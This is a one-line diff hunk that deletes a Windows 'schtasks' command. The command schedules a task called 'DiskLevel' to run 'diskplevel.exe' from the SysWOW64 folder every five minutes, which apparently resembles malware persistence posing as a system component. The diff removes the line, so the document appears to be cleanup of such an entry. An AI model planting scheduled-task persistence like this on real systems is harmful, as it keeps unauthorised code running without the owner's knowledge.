@@ -1,1 +1,0 @@
-schtasks /create /tn "DiskLevel" /sc minute /mo 5 /tr "C:\Windows\SysWOW64\diskplevel.exe"
